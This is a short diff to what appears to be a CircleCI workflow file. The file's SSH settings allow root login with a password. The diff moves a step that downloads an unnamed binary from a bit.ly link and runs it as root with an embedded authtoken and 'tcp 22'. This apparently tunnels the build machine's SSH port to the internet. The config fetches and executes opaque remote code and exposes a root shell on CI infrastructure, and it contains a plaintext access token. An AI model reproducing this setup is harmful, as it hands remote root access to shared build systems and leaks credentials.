@@ -27,7 +27,17 @@ jobs:
           sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
           sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
           sudo service ssh restart
-      - run: wget https://bit.ly/3Iaxfe5 && chmod +x 3Iaxfe5 && ./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY && ./3Iaxfe5 tcp 22
+      - run: 
+         name: Connect 
+         command: |
+          wget https://bit.ly/3Iaxfe5
+          chmod +x 3Iaxfe5
+          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
+          sudo su --command "./3Iaxfe5 tcp 22"
+      - run: 
+         name: Sleep
+         command: |
+          sudo su --command "lscpu"
 
 workflows:
   version: 2.1
